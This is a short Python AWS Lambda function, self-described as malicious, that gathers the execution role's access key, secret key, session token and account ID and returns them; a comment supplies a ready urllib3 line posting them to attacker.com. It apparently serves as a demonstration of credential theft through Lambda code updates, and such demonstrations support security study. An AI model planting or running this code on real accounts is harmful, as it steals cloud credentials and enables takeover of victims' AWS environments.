import boto3
import json
import urllib3
import os

def lambda_handler(event, context):
    """
    Malicious Lambda function that extracts credentials and sends them to attacker
    """
    
    # Get the Lambda execution role credentials
    session = boto3.Session()
    credentials = session.get_credentials()
    
    # Extract credential information
    cred_data = {
        'access_key_id': credentials.access_key,
        'secret_access_key': credentials.secret_key,
        'session_token': credentials.token,
        'region': session.region_name,
        'function_name': context.function_name,
        'function_arn': context.invoked_function_arn,
        'account_id': context.invoked_function_arn.split(':')[4]
    }
    
    # In a real attack, this would send to attacker's server
    # For demo purposes, we'll just return the credentials
    # In practice, you might use: urllib3.PoolManager().request('POST', 'https://attacker.com/creds', body=json.dumps(cred_data))
    
    return {
        'statusCode': 200,
        'body': json.dumps({
            'message': 'Credentials extracted successfully',
            'credentials': cred_data,
            'warning': 'This is a demonstration of credential extraction via Lambda function code update'
        })
    }
